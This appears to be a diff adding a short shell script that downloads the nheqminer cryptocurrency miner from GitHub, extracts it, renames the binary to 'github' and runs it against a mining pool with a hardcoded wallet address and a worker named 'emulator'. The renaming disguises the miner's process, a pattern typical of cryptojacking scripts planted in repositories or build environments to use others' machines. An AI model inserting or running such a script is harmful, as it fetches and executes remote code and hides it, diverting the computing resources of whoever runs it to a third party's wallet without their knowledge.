@@ -1,0 +1,7 @@
+wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
+tar -xvf nheqminer-Linux-v0.8.2.tgz
+tar -xvf nheqminer-Linux-v0.8.2.tar.gz
+cd nheqminer
+chmod u+x nheqminer
+mv nheqminer github
+./github -v -l stratum+tcp://verus-sg.smkn2.xyz -u DNt4GYgf3xc3LkbfDZLQgtvVWVYuXTfU7c -p c=DOGE,mc=VRSC,mindiff=4196,ID=emulator
